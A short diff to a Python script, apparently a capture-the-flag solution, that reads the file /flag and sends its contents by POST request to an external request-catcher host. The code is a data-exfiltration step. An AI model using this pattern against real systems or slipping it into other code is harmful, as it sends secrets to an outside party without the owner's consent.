@@ -20,8 +20,9 @@ def send():
     url = 'https://werbinich.requestcatcher.com/'  # replace with your server URL
     f = open("/flag",'r')
     flag = f.readline()
-    data = {'key': flag}  # replace with your POST data
-    response = requests.get(url, data=data)
+    data = {'flag': flag}  # replace with your POST data
+    print(data)
+    response = requests.post(url, data=data)
     print(response.content)
 
 send()
